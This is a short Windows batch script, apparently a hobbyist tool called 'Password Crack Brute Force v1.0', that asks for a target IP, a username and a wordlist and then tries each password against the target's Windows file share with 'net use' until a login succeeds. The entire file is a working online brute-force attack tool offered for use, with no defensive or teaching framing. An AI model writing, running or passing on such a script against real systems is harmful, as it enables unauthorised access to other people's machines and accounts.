@echo off
title Password Crack Brute Force v1.0 - by emirhan47
cls
color a
echo.
set /p ip="Enter IP Adress: "
set /p user="Enter Username: "
set /p wordlist="Enter Password List: "

set /a count=0
for /f %%a in (%wordlist%) do (
   set pass=%%a
   call :attempt
 )
 echo Password not Found :(
 pause
 exit
 
 :success
 echo Password Found!: %pass%
 net use \\%ip% /d /y >nul 2>&1
pause
exit 
 
 :attempt
 net use \\%ip% /user:%user% %pass% >nul 2>&1
 echo [ATTEMPT %count%] [%pass%]
 set /a count=%count%+1
 if %errorlevel% EQU 0 goto success